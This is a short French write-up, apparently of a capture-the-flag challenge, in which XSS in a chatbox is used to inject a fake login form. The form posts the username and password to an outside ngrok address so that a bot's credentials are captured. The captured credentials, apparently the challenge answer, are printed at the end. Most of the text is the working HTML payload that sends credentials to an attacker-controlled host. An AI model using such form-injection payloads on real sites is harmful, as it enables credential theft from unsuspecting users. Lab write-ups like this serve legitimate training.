On a une chatbox, avec la possibilité de faire du XSS, mais cela est-il la vrai solution pour extraire le mdp ?

Il faut poster le formulaire de login et le rediriger vers un site pirate et attendre que le bot trigger l'exploit:

```HTML
<div class="modal fade" id="login-modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalCenterTitle">Connexion</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<form id="loginForm" action="https://e635-82-66-107-105.eu.ngrok.io" method="POST">
					<div class="form-group">
						<label for="username">Utilisateur</label>
						<input type="text" name="username" class="form-control" id="log_username" placeholder="Utilisateur">
					</div>
					<div class="form-group">
						<label for="password">Mot de passe</label>
						<input type="password" name="password" class="form-control" id="Password" placeholder="Mot de passe">
					</div>
					<button id="login-btn" type="submit" class="btn btn-primary">Envoyer</button>
				</form>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Fermer</button>
			</div>
		</div>
	</div>
</div>
```

On récupère donc:

>> username : Shopeors

>> password :	X5S_4_3V3r!!
